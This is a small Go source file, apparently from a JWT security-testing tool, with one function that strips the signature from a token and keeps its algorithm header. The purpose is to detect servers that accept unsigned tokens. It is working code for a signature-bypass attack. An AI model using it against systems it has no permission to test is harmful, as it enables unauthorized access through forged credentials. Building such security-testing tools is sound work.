package exploit

import (
	"fmt"

	"github.com/cerberauth/jwtop/jwt/editor"
)

// NullSignature returns a copy of the token with an empty signature segment
// ("header.payload."). The alg header field is preserved unchanged, so the
// server sees the original algorithm name but receives no cryptographic proof.
//
// A server that accepts this token is not verifying the signature at all, or
// treats an empty signature as valid for the declared algorithm.
func NullSignature(tokenString string) (string, error) {
	te, err := editor.NewTokenEditor(tokenString)
	if err != nil {
		return "", fmt.Errorf("parsing token: %w", err)
	}
	result, err := te.WithoutSignature()
	if err != nil {
		return "", fmt.Errorf("stripping signature: %w", err)
	}
	return result, nil
}
